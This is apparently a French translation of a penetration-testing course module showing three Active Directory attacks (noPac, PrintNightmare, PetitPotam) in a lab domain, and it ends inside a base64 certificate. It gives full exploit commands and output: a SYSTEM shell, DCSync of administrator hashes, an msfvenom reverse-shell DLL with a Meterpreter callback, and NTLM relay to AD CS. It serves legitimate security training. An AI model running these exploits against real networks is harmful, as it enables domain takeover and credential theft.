Vulnérabilités de Bleeding Edge
===============================

* * * * *

En ce qui concerne la gestion et les cycles des correctifs, de nombreuses organisations ne déploient pas rapidement les correctifs sur leurs réseaux. Pour cette raison, nous pourrons peut-être obtenir une victoire rapide soit pour l'accès initial, soit pour l'élévation des privilèges de domaine en utilisant une tactique très récente. Au moment de la rédaction (avril 2022), les trois techniques présentées dans cette section sont relativement récentes (au cours des 6 à 9 derniers mois). Il s'agit de sujets avancés qui ne peuvent pas être traités de manière approfondie dans une seule section de module. Le but de la démonstration de ces attaques est de permettre aux étudiants d'essayer les attaques les plus récentes et les plus performantes dans un environnement de laboratoire contrôlé et de présenter des sujets qui seront abordés de manière extrêmement approfondie dans des modules Active Directory plus avancés. Comme pour toute attaque, si vous ne comprenez pas leur fonctionnement ou le risque qu'elles pourraient représenter pour un environnement de production, il serait préférable de ne pas les tenter lors d'un engagement client réel. Ceci étant dit, ces techniques pourraient être considérées comme « sûres » et moins destructrices que des attaques telles que [Zerologon](https://www.crowdstrike.com/blog/cve-2020-1472-zerologon-security-advisory/) ou [DCShadow](https://stealthbits.com/blog/what-is-a-dcshadow-attack-and-how-to-defend-against-it/) . Néanmoins, nous devons toujours faire preuve de prudence, prendre des notes détaillées et communiquer avec nos clients. Toutes les attaques comportent un risque. Par exemple, l' `PrintNightmare`attaque pourrait potentiellement faire planter le service de spouleur d'impression sur un hôte distant et provoquer une interruption du service.

En tant que praticiens de la sécurité de l'information dans un domaine en évolution rapide, nous devons rester vigilants et au courant des attaques récentes et des nouveaux outils et techniques. Nous vous recommandons d'essayer toutes les techniques de cette section et d'effectuer des recherches supplémentaires pour trouver d'autres méthodes permettant de réaliser ces attaques. Maintenant, plongeons-nous.

* * * * *

Configuration du scénario
-------------------------

Dans cette section, nous exécuterons tous les exemples d'un hôte d'attaque Linux. Vous pouvez générer les hôtes de cette section à la fin de cette section et vous connecter en SSH à l'hôte d'attaque Linux ATTACK01. Pour la partie de cette section qui démontre l'interaction à partir d'un hôte Windows (à l'aide de Rubeus et Mimikatz), vous pouvez générer l'hôte d'attaque MS01 dans la section précédente ou suivante et utiliser le blob de certificat base64 obtenu en utilisant `ntlmrelayx.py`et `petitpotam.py`pour effectuer la même transmission. attaque de tickets à l'aide de Rubeus, comme démontré vers la fin de cette section.

* * * * *

NoPac (usurpation du nom de compte SamAccount)
----------------------------------------------

Un bon exemple de menace émergente est la [vulnérabilité Sam_The_Admin](https://techcommunity.microsoft.com/t5/security-compliance-and-identity/sam-name-impersonation/ba-p/3042699) , également appelée `noPac`ou désignée `SamAccountName Spoofing`publiée fin 2021. Cette vulnérabilité englobe deux CVE [2021-42278](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278) et [2021-42287](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287) , permettant une élévation de privilèges intra-domaine de n'importe quel utilisateur de domaine standard. à l'accès au niveau administrateur de domaine en une seule commande. Voici un aperçu rapide de ce que chaque CVE fournit concernant cette vulnérabilité.

| 42278 | 42287 |
| --- | --- |
| `42278`est une vulnérabilité de contournement avec le Security Account Manager (SAM). | `42287`est une vulnérabilité dans le certificat d'attribut de privilège Kerberos (PAC) dans ADDS. |

Ce chemin d'exploitation profite de la possibilité de changer le `SamAccountName`compte d'un ordinateur en celui d'un contrôleur de domaine. Par défaut, les utilisateurs authentifiés peuvent ajouter jusqu'à [dix ordinateurs à un domaine](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/add-workstations-to-domain) . Ce faisant, nous modifions le nom du nouvel hôte pour qu'il corresponde au SamAccountName d'un contrôleur de domaine. Une fois cela fait, nous devons demander des tickets Kerberos, ce qui oblige le service à nous émettre des tickets sous le nom du DC au lieu du nouveau nom. Lorsqu'un TGS est demandé, il émettra le ticket avec le nom correspondant le plus proche. Une fois cela fait, nous aurons accès à ce service et pourrons même recevoir un shell SYSTEM sur un contrôleur de domaine. Le déroulement de l'attaque est décrit en détail dans ce [billet de blog](https://www.secureworks.com/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware) .

Nous pouvons utiliser cet [outil](https://github.com/Ridter/noPac) pour effectuer cette attaque. Cet outil est présent sur l'hôte ATTACK01 en `/opt/noPac`.

NoPac utilise de nombreux outils dans Impacket pour communiquer avec, télécharger une charge utile et émettre des commandes de l'hôte d'attaque vers le contrôleur de domaine cible. Avant d'essayer d'utiliser l'exploit, nous devons nous assurer qu'Impacket est installé et que le dépôt d'exploit noPac est cloné sur notre hôte d'attaque si nécessaire. Nous pouvons utiliser ces commandes pour ce faire :

#### S'assurer qu'Impacket est installé

  Vulnérabilités de Bleeding Edge

```
dsgsec@htb[/htb]$ git clone https://github.com/SecureAuthCorp/impacket.git

```

  Vulnérabilités de Bleeding Edge

```
dsgsec@htb[/htb]$ python setup.py install

```

#### Clonage du dépôt d'exploits NoPac

  Vulnérabilités de Bleeding Edge

```
dsgsec@htb[/htb]$ git clone https://github.com/Ridter/noPac.git

```

Une fois Impacket installé et que nous nous assurons que le dépôt est cloné dans notre boîte d'attaque, nous pouvons utiliser les scripts du répertoire NoPac pour vérifier si le système est vulnérable à l'aide d'un scanner ( `scanner.py`), puis utiliser l'exploit ( `noPac.py`) pour obtenir un shell en tant que `NT AUTHORITY/SYSTEM`. Nous pouvons utiliser le scanner avec un compte utilisateur de domaine standard pour tenter d'obtenir un TGT du contrôleur de domaine cible. En cas de succès, cela indique que le système est en fait vulnérable. Nous remarquerons également que le `ms-DS-MachineAccountQuota`nombre est défini sur 10. Dans certains environnements, un administrateur système astucieux peut définir la `ms-DS-MachineAccountQuota`valeur sur 0. Si tel est le cas, l'attaque échouera car notre utilisateur n'aura pas le droit d'ajouter un nouveau compte machine. . Définir cette valeur sur `0`peut empêcher un certain nombre d'attaques AD.

#### Recherche de NoPac

  Vulnérabilités de Bleeding Edge

```
dsgsec@htb[/htb]$ sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap

███    ██  ██████  ██████   █████   ██████
████   ██ ██    ██ ██   ██ ██   ██ ██
██ ██  ██ ██    ██ ██████  ███████ ██
██  ██ ██ ██    ██ ██      ██   ██ ██
██   ████  ██████  ██      ██   ██  ██████

[*] Current ms-DS-MachineAccountQuota = 10
[*] Got TGT with PAC from 172.16.5.5. Ticket size 1484
[*] Got TGT from ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL. Ticket size 663

```

Il existe de nombreuses façons différentes d'utiliser NoPac pour élargir notre accès. Une solution consiste à obtenir un shell avec des privilèges de niveau SYSTEM. Nous pouvons le faire en exécutant noPac.py avec la syntaxe ci-dessous pour usurper l'identité du compte d'administrateur intégré et passer à une session shell semi-interactive sur le contrôleur de domaine cible. Cela pourrait être « bruyant » ou être bloqué par AV ou EDR.

#### Exécuter NoPac et obtenir un shell

  Vulnérabilités de Bleeding Edge

```
dsgsec@htb[/htb]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap

███    ██  ██████  ██████   █████   ██████
████   ██ ██    ██ ██   ██ ██   ██ ██
██ ██  ██ ██    ██ ██████  ███████ ██
██  ██ ██ ██    ██ ██      ██   ██ ██
██   ████  ██████  ██      ██   ██  ██████

[*] Current ms-DS-MachineAccountQuota = 10
[*] Selected Target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] will try to impersonat administrator
[*] Adding Computer Account "WIN-LWJFQMAXRVN$"
[*] MachineAccount "WIN-LWJFQMAXRVN$" password = &A#x8X^5iLva
[*] Successfully added machine account WIN-LWJFQMAXRVN$ with password &A#x8X^5iLva.
[*] WIN-LWJFQMAXRVN$ object = CN=WIN-LWJFQMAXRVN,CN=Computers,DC=INLANEFREIGHT,DC=LOCAL
[*] WIN-LWJFQMAXRVN$ sAMAccountName == ACADEMY-EA-DC01
[*] Saving ticket in ACADEMY-EA-DC01.ccache
[*] Resting the machine account to WIN-LWJFQMAXRVN$
[*] Restored WIN-LWJFQMAXRVN$ sAMAccountName to original value
[*] Using TGT from cache
[*] Impersonating administrator
[*] 	Requesting S4U2self
[*] Saving ticket in administrator.ccache
[*] Remove ccache of ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] Rename ccache with target ...
[*] Attempting to del a computer with the name: WIN-LWJFQMAXRVN$
[-] Delete computer WIN-LWJFQMAXRVN$ Failed! Maybe the current user does not have permission.
[*] Pls make sure your choice hostname and the -dc-ip are same machine !!
[*] Exploiting..
[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>

```

Nous remarquerons que a `semi-interactive shell session`est établi avec la cible en utilisant [smbexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py) . Gardez à l'esprit qu'avec les shells smbexec, nous devrons utiliser des chemins exacts au lieu de naviguer dans la structure de répertoires à l'aide de `cd`.

Il est important de noter que NoPac.py enregistre le TGT dans le répertoire de l'hôte d'attaque sur lequel l'exploit a été exécuté. Nous pouvons utiliser `ls`pour confirmer.

#### Confirmation de l'emplacement des billets enregistrés

  Vulnérabilités de Bleeding Edge

```
dsgsec@htb[/htb]$ ls

administrator_DC01.INLANEFREIGHT.local.ccache  noPac.py   requirements.txt  utils
README.md  scanner.py

```

Nous pourrions ensuite utiliser le fichier ccache pour effectuer un pass-the-ticket et effectuer d'autres attaques telles que DCSync. Nous pouvons également utiliser l'outil avec le `-dump`flag pour effectuer une DCSync en utilisant secretsdump.py. Cette méthode créerait toujours un fichier ccache sur le disque, dont nous voudrions connaître et nettoyer.

#### Utilisation de noPac pour DCSync le compte administrateur intégré

  Vulnérabilités de Bleeding Edge

```
dsgsec@htb[/htb]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator

███    ██  ██████  ██████   █████   ██████
████   ██ ██    ██ ██   ██ ██   ██ ██
██ ██  ██ ██    ██ ██████  ███████ ██
██  ██ ██ ██    ██ ██      ██   ██ ██
██   ████  ██████  ██      ██   ██  ██████

[*] Current ms-DS-MachineAccountQuota = 10
[*] Selected Target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] will try to impersonat administrator
[*] Alreay have user administrator ticket for target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] Pls make sure your choice hostname and the -dc-ip are same machine !!
[*] Exploiting..
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
[*] Kerberos keys grabbed
inlanefreight.local\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
inlanefreight.local\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25
inlanefreight.local\administrator:des-cbc-md5:70add6e02f70321f
[*] Cleaning up...

```

* * * * *

Considérations sur Windows Defender et SMBEXEC.py
-------------------------------------------------

Si Windows Defender (ou un autre produit AV ou EDR) est activé sur une cible, notre session shell peut être établie, mais l'émission de commandes échouera probablement. La première chose que fait smbexec.py est de créer un service appelé `BTOBTO`. Un autre service appelé `BTOBO`est créé et toute commande que nous tapons est envoyée à la cible via SMB dans un fichier .bat appelé `execute.bat`. À chaque nouvelle commande que nous tapons, un nouveau script batch est créé et renvoyé dans un fichier temporaire qui exécute ledit script et le supprime du système. Examinons un journal Windows Defender pour voir quel comportement a été considéré comme malveillant.

#### Journal de quarantaine Windows Defender

![image](https://academy.hackthebox.com/storage/modules/143/defenderLog.png)

Si l'opsec ou le fait d'être « silencieux » est une considération lors d'une évaluation, nous voudrions probablement éviter un outil comme smbexec.py. Ce module se concentre sur les tactiques et les techniques. Nous affinerons notre méthodologie au fur et à mesure de notre progression dans des modules plus avancés, mais nous devons d'abord obtenir une base solide pour énumérer et attaquer Active Directory.

* * * * *

ImprimerCauchemar
-----------------

`PrintNightmare`est le surnom donné à deux vulnérabilités ( [CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) et [CVE-2021-1675](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675) ) trouvées dans le [service Print Spooler](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-prsod/7262f540-dd18-46a3-b645-8ea9b59753dc) qui s'exécute sur tous les systèmes d'exploitation Windows. De nombreux exploits ont été écrits sur la base de ces vulnérabilités, permettant une élévation de privilèges et l'exécution de code à distance. L'utilisation de cette vulnérabilité pour l'élévation de privilèges locale est abordée dans le module [Escalade de privilèges Windows](https://academy.hackthebox.com/course/preview/windows-privilege-escalation) , mais il est également important de s'entraîner dans le contexte des environnements Active Directory pour obtenir un accès à distance à un hôte. Pratiquons avec un exploit qui peut nous permettre d'obtenir une session shell SYSTEM sur un contrôleur de domaine exécuté sur un hôte Windows Server 2019.

Avant de mener cette attaque, nous devons récupérer l'exploit que nous allons utiliser. Dans ce cas, nous utiliserons l'exploit [de cube0x0](https://twitter.com/cube0x0?lang=en) . Nous pouvons utiliser Git pour le cloner sur notre hôte d'attaque :

#### Cloner l'exploit

  Vulnérabilités de Bleeding Edge

```
dsgsec@htb[/htb]$ git clone https://github.com/cube0x0/CVE-2021-1675.git

```

Pour que cet exploit fonctionne avec succès, nous devrons utiliser la version cube0x0 d'Impacket. Nous devrons peut-être désinstaller la version d'Impacket sur notre hôte d'attaque et installer celui de cube0x0 (celui-ci est déjà installé sur ATTACK01 dans le laboratoire). Nous pouvons utiliser les commandes ci-dessous pour accomplir cela :

#### Installer la version cube0x0 d'Impacket

  Vulnérabilités de Bleeding Edge

```
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install

```

Nous pouvons utiliser `rpcdump.py`pour voir si `Print System Asynchronous Protocol`et `Print System Remote Protocol`sont exposés sur la cible.

#### Énumération pour MS-RPRN

  Vulnérabilités de Bleeding Edge

```
dsgsec@htb[/htb]$ rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'

Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol
Protocol: [MS-RPRN]: Print System Remote Protocol

```

Après avoir confirmé cela, nous pouvons tenter d'utiliser l'exploit. Nous pouvons commencer par créer une charge utile DLL en utilisant `msfvenom`.

#### Générer une charge utile DLL

  Vulnérabilités de Bleeding Edge

```
dsgsec@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of dll file: 8704 bytes

```

Nous hébergerons ensuite cette charge utile dans un partage SMB que nous créons sur notre hôte d'attaque à l'aide de `smbserver.py`.

#### Création d'un partage avec smbserver.py

  Vulnérabilités de Bleeding Edge

```
dsgsec@htb[/htb]$ sudo smbserver.py -smb2support CompData /path/to/backupscript.dll

Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

```

Une fois le partage créé et hébergeant notre charge utile, nous pouvons utiliser MSF pour configurer et démarrer un multi-gestionnaire chargé de capturer le shell inversé qui est exécuté sur la cible.

#### Configuration et démarrage de MSF multi/handler

  Vulnérabilités de Bleeding Edge

```
[msf](Jobs:0 Agents:0) >> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST 172.16.5.225
LHOST => 10.3.88.114
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 8080
LPORT => 8080
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run

[*] Started reverse TCP handler on 172.16.5.225:8080

```

Avec le partage hébergeant notre charge utile et notre multi-gestionnaire à l'écoute d'une connexion, nous pouvons tenter d'exécuter l'exploit sur la cible. La commande ci-dessous explique comment nous utilisons l'exploit :

#### Exécuter l'exploit

  Vulnérabilités de Bleeding Edge

```
dsgsec@htb[/htb]$ sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'

[*] Connecting to ncacn_np:172.16.5.5[\PIPE\spoolss]
[+] Bind OK
[+] pDriverPath Found C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL
[*] Executing \??\UNC\172.16.5.225\CompData\backupscript.dll
[*] Try 1...
[*] Stage0: 0
[*] Try 2...
[*] Stage0: 0
[*] Try 3...

<SNIP>

```

Remarquez comment à la fin de la commande, nous incluons le chemin d'accès au partage hébergeant notre charge utile ( `\\<ip address of attack host>\ShareName\nameofpayload.dll`). Si tout se passe bien après l'exécution de l'exploit, la cible accédera au partage et exécutera la charge utile. La charge utile rappellera ensuite notre multi-gestionnaire, nous donnant un shell SYSTEM élevé.

#### Obtenir le shell SYSTEM

  Vulnérabilités de Bleeding Edge

```
[*] Sending stage (200262 bytes) to 172.16.5.5
[*] Meterpreter session 1 opened (172.16.5.225:8080 -> 172.16.5.5:58048 ) at 2022-03-29 13:06:20 -0400

(Meterpreter 1)(C:\Windows\system32) > shell
Process 5912 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

```

Une fois l'exploit exécuté, nous remarquerons qu'une session Meterpreter a été démarrée. Nous pouvons ensuite accéder à un shell SYSTEM et voir que nous disposons des privilèges NT AUTHORITY\SYSTEM sur le contrôleur de domaine cible à partir d'un simple compte d'utilisateur de domaine standard.

* * * * *

PetitPotam (MS-EFSRPC)
----------------------

PetitPotam ( [CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942) ) est une vulnérabilité d'usurpation d'identité LSA qui a été corrigée en août 2021. La faille permet à un attaquant non authentifié de contraindre un contrôleur de domaine à s'authentifier auprès d'un autre hôte en utilisant NTLM sur le port 445 via le [protocole distant de l'autorité de sécurité locale ( LSARPC) en abusant du ](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-lsad/1b5471ef-4c33-4a91-b079-dfcbb82f05cc)[Encrypting File System Remote Protocol (MS-EFSRPC)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31) de Microsoft . Cette technique permet à un attaquant non authentifié de prendre le contrôle d'un domaine Windows dans lequel [les services de certificats Active Directory (AD CS)](https://docs.microsoft.com/en-us/learn/modules/implement-manage-active-directory-certificate-services/2-explore-fundamentals-of-pki-ad-cs) sont utilisés. Lors de l'attaque, une demande d'authentification du contrôleur de domaine ciblé est relayée vers la page d'inscription Web de l'hôte de l'autorité de certification (CA) et effectue une demande de signature de certificat (CSR) pour un nouveau certificat numérique. Ce certificat peut ensuite être utilisé avec un outil tel que `Rubeus`ou `gettgtpkinit.py`depuis [PKINITtools](https://github.com/dirkjanm/PKINITtools) pour demander un TGT pour le contrôleur de domaine, qui peut ensuite être utilisé pour parvenir à une compromission de domaine via une attaque DCSync.

[Cet](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/) article de blog donne plus de détails sur le relais NTLM vers AD CS et l'attaque PetitPotam.

Passons en revue l'attaque. Tout d'abord, nous devons démarrer `ntlmrelayx.py`dans une fenêtre sur notre hôte d'attaque, en spécifiant l'URL d'inscription Web pour l'hôte CA et en utilisant le modèle KerberosAuthentication ou DomainController AD CS. Si nous ne connaissions pas l'emplacement de l'autorité de certification, nous pourrions utiliser un outil tel que [certi](https://github.com/zer1t0/certi) pour tenter de la localiser.

#### Démarrage de ntlmrelayx.py

  Vulnérabilités de Bleeding Edge

```
dsgsec@htb[/htb]$ sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a -

Copyright 2021 SecureAuth Corporation

[+] Impacket Library Installation Path: /usr/local/lib/python3.9/dist-packages/impacket-0.9.24.dev1+20211013.152215.3fe2d73a-py3.9.egg/impacket
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client SMTP loaded..
[+] Protocol Attack DCSYNC loaded..
[+] Protocol Attack HTTP loaded..
[+] Protocol Attack HTTPS loaded..
[+] Protocol Attack IMAP loaded..
[+] Protocol Attack IMAPS loaded..
[+] Protocol Attack LDAP loaded..
[+] Protocol Attack LDAPS loaded..
[+] Protocol Attack MSSQL loaded..
[+] Protocol Attack RPC loaded..
[+] Protocol Attack SMB loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server
[*] Setting up WCF Server

[*] Servers started, waiting for connections

```

Dans une autre fenêtre, nous pouvons exécuter l'outil [PetitPotam.py](https://github.com/topotam/PetitPotam) . Nous exécutons cet outil avec la commande `python3 PetitPotam.py <attack host IP> <Domain Controller IP>`pour tenter de contraindre le contrôleur de domaine à s'authentifier auprès de notre hôte sur lequel ntlmrelayx.py est en cours d'exécution.

Il existe une version exécutable de cet outil qui peut être exécutée à partir d'un hôte Windows. Le déclencheur d'authentification a également été ajouté à Mimikatz et peut être exécuté comme suit à l'aide du module EFS (Encrypting File System) : `misc::efs /server:<Domain Controller> /connect:<ATTACK HOST>`. Il existe également une implémentation PowerShell de l'outil [Invoke-PetitPotam.ps1](https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Petitpotam.ps1) .

Ici, nous exécutons l'outil et tentons de forcer l'authentification via la méthode [EfsRpcOpenFileRaw](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/ccc4fb75-1c86-41d7-bbc4-b278ec13bfb8) .

#### Exécution de PetitPotam.py

  Vulnérabilités de Bleeding Edge

```
dsgsec@htb[/htb]$ python3 PetitPotam.py 172.16.5.225 172.16.5.5

              ___            _        _      _        ___            _
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '\
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_|
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""|
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'

              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                      by topotam (@topotam77)

                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN

Trying pipe lsarpc
[-] Connecting to ncacn_np:172.16.5.5[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!

[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!

```

#### Attraper un certificat codé en Base64 pour DC01

De retour dans notre autre fenêtre, nous verrons une demande de connexion réussie et obtiendrons le certificat encodé en base64 pour le contrôleur de domaine si l'attaque réussit.

  Vulnérabilités de Bleeding Edge

```
dsgsec@htb[/htb]$ sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[+] Impacket Library Installation Path: /usr/local/lib/python3.9/dist-packages/impacket-0.9.24.dev1+20211013.152215.3fe2d73a-py3.9.egg/impacket
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client SMTP loaded..
[+] Protocol Attack DCSYNC loaded..
[+] Protocol Attack HTTP loaded..
[+] Protocol Attack HTTPS loaded..
[+] Protocol Attack IMAP loaded..
[+] Protocol Attack IMAPS loaded..
[+] Protocol Attack LDAP loaded..
[+] Protocol Attack LDAPS loaded..
[+] Protocol Attack MSSQL loaded..
[+] Protocol Attack RPC loaded..
[+] Protocol Attack SMB loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server
[*] Setting up WCF Server

[*] Servers started, waiting for connections
[*] SMBD-Thread-4: Connection from INLANEFREIGHT/ACADEMY-EA-DC01$@172.16.5.5 controlled, attacking target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL
[*] HTTP server returned error code 200, treating as a successful login
[*] Authenticating against http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL as INLANEFREIGHT/ACADEMY-EA-DC01$ SUCCEED
[*] SMBD-Thread-4: Connection from INLANEFREIGHT/ACADEMY-EA-DC01$@172.16.5.5 controlled, attacking target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL
[*] HTTP server returned error code 200, treating as a successful login
[*] Authenticating against http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL as INLANEFREIGHT/ACADEMY-EA-DC01$ SUCCEED
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] GOT CERTIFICATE!
[*] Base64 certificate of user ACADEMY-EA-DC01$:
MIIStQIBAzCCEn8GCSqGSIb3DQEHAaCCEnAEghJsMIISaDCCCJ8GCSqGSIb3DQEHBqCCCJAwggiMAgEAMIIIhQYJKoZIhvcNAQcBMBwGCiqGSIb3DQEMAQMwDgQItd0rgWuhmI0CAggAgIIIWAvQEknxhpJWLyXiVGcJcDVCquWE6Ixzn86jywWY4HdhG624zmBgJKXB6OVV9bRODMejBhEoLQQ+jMVNrNoj3wxg6z/QuWp2pWrXS9zwt7bc1SQpMcCjfiFalKIlpPQQiti7xvTMokV+X6YlhUokM9yz3jTAU0ylvw82LoKsKMCKVx0mnhVDUlxR+i1Irn4piInOVfY0c2IAGDdJViVdXgQ7njtkg0R+Ab0CWrqLCtG6nVPIJbxFE5O84s+P3xMBgYoN4cj/06whmVPNyUHfKUbe5ySDnTwREhrFR4DE7kVWwTvkzlS0K8Cqoik7pUlrgIdwRUX438E+bhix+NEa+fW7+rMDrLA4gAvg3C7O8OPYUg2eR0Q+2kN3zsViBQWy8fxOC39lUibxcuow4QflqiKGBC6SRaREyKHqI3UK9sUWufLi7/gAUmPqVeH/JxCi/HQnuyYLjT+TjLr1ATy++GbZgRWT+Wa247voHZUIGGroz8GVimVmI2eZTl1LCxtBSjWUMuP53OMjWzcWIs5AR/4sagsCoEPXFkQodLX+aJ+YoTKkBxgXa8QZIdZn/PEr1qB0FoFdCi6jz3tkuVdEbayK4NqdbtX7WXIVHXVUbkdOXpgThcdxjLyakeiuDAgIehgFrMDhmulHhpcFc8hQDle/W4e6zlkMKXxF4C3tYN3pEKuY02FFq4d6ZwafUbBlXMBEnX7mMxrPyjTsKVPbAH9Kl3TQMsJ1Gg8F2wSB5NgfMQvg229HvdeXmzYeSOwtl3juGMrU/PwJweIAQ6IvCXIoQ4x+kLagMokHBholFDe9erRQapU9f6ycHfxSdpn7WXvxXlZwZVqxTpcRnNhYGr16ZHe3k4gKaHfSLIRst5OHrQxXSjbREzvj+NCHQwNlq2MbSp8DqE1DGhjEuv2TzTbK9Lngq/iqF8KSTLmqd7wo2OC1m8z9nrEP5C+zukMVdN02mObtyBSFt0VMBfb9GY1rUDHi4wPqxU0/DApssFfg06CNuNyxpTOBObvicOKO2IW2FQhiHov5shnc7pteMZ+r3RHRNHTPZs1I5Wyj/KOYdhcCcVtPzzTDzSLkia5ntEo1Y7aprvCNMrj2wqUjrrq+pVdpMeUwia8FM7fUtbp73xRMwWn7Qih0fKzS3nxZ2/yWPyv8GN0l1fOxGR6iEhKqZfBMp6padIHHIRBj9igGlj+D3FPLqCFgkwMmD2eX1qVNDRUVH26zAxGFLUQdkxdhQ6dY2BfoOgn843Mw3EOJVpGSTudLIhh3KzAJdb3w0k1NMSH3ue1aOu6k4JUt7tU+oCVoZoFBCr+QGZWqwGgYuMiq9QNzVHRpasGh4XWaJV8GcDU05/jpAr4zdXSZKove92gRgG2VBd2EVboMaWO3axqzb/JKjCN6blvqQTLBVeNlcW1PuKxGsZm0aigG/Upp8I/uq0dxSEhZy4qvZiAsdlX50HExuDwPelSV4OsIMmB5myXcYohll/ghsucUOPKwTaoqCSN2eEdj3jIuMzQt40A1ye9k4pv6eSwh4jI3EgmEskQjir5THsb53Htf7YcxFAYdyZa9k9IeZR3IE73hqTdwIcXjfXMbQeJ0